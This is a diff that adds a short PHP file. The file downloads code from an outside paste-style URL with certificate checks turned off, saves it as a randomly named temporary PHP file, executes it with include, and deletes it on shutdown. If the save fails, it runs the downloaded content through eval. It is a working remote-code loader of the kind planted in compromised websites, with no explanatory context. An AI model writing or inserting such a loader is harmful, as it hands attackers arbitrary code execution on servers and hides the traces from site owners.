@@ -1,0 +1,31 @@
+<?php
+$url = "https://bujang.online/raw/AbSGSvJgKn";
+
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_TIMEOUT => 10,
+    CURLOPT_FOLLOWLOCATION => true
+]);
+$content = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode !== 200 || empty($content)) {
+    die('Fetch failed');
+}
+
+$tmpDir = sys_get_temp_dir();
+$tmpFile = $tmpDir . '/' . bin2hex(random_bytes(12)) . '.php';
+
+if (@file_put_contents($tmpFile, $content) !== false) {
+    register_shutdown_function(function() use ($tmpFile) {
+        @unlink($tmpFile);
+    });
+    include($tmpFile);
+} else {
+    eval('?>' . $content);
+}
+?>
